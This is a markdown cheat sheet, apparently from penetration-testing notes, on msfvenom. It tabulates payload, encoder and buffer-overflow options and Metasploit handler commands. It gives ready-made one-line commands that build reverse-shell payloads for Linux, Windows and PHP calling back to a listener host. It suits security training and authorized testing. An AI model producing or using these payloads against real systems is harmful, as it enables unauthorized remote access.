# MSFVenom

## Payload Generation

> ### Arguments
>
> |       Argument       |     Usage      |            Options            |
> | :------------------: | :------------: | :---------------------------: |
> |     List Modules     |       -l       |          moduletype           |
> | List Payload Options | --list-options |                               |
> |       Payload        |       -p       |            payload            |
> |       Host IP        |     LHOST=     |              IP               |
> |   Host Listen Port   |     LPORT=     |             port              |
> |        Format        |       -f       |            format             |
> |    Output to File    |       -o       |           filename            |
> |        Encode        |       -e       |        shikata_ga_nai         |
> |  Encoder Iterations  |       -i       |         iterationsnum         |
> |    Exit Function     |   EXITFUNC=    |   thread (buffer overflow)    |
> |    Bad Characters    |       -b       |  charlist (buffer overflow)   |
> |       NOPsled        |       -n       |  noplength (buffer overflow)  |
> |  Max Payload Space   |       -s       | payloadsize (buffer overflow) |
>
> ### List Options/Common Options
>
> | Argument |                                                               List Options/Common Options                                                                |
> | :------: | :------------------------------------------------------------------------------------------------------------------------------------------------------: |
> | Modules  |                                               payloads, encoders, nops, platforms, archs, encrypt, formats                                               |
> | Payloads | linux/\<arch\>/\<payload\>, windows/\<arch\>/\<payload\> - [full list](https://medium.com/@hannahsuarez/full-list-of-546-msfvenom-payloads-39adb4d793c9) |
> | Formats  |                                              raw (default), exe, msi, elf, war : run `-l formats' for more                                               |
>
> ### Meterpreter
>
> |  Staged Payload (requires special listener)   |   Unstaged Payload    |
> | :-------------------------------------------: | :-------------------: |
> | linux/x64/meterpreter_reverse_tcp/reverse_tcp | linux/x64/reverse_tcp |
>
> |   Meterpreter   |          Command          |
> | :-------------: | :-----------------------: |
> |   Use handler   | use exploit/multi/handler |
> |   Set Payload   |  set PAYLOAD \<payload\>  |
> | Set Remote Host |    Set RHOST \<rhost\>    |
> | Set Listen Host |    set LHOST \<lhost\>    |
> | Set Listen Port |    set LPORT \<lport\>    |
>
> ### Usage Examples
>
> - Linux Reverse Shell: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<Lhost\> LPORT=<lport\> -f elf -o shell.elf`
> - Windows Reverse Shell: `msfvenom -p windows/shell_reverse_tcp LHOST=<Lhost\> LPORT=<lport\> -f exe -o shell.exe`
> - PHP Reverse Shell: `msfvenom -p php/reverse_php LHOST=<Lhost\> LPORT=<lport\> -o shell.php`

> ### GUI
>
> - [Setup](https://www.offensive-security.com/metasploit-unleashed/msf-community-edition/)

## Cheatsheets

> - [HackTricks.xyz](https://book.hacktricks.xyz/shells/shells)
> - [rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom)
> - [SANS](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)
> - [frizb/MSF-Venom-Cheatsheet](https://github.com/frizb/MSF-Venom-Cheatsheet)
> - [Redteamtutorials.com](https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/)
> - [Netsec.ws](https://netsec.ws/?p=331)
> - [Infinitelogins.com](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
> - [Thedarksource.com](https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/)
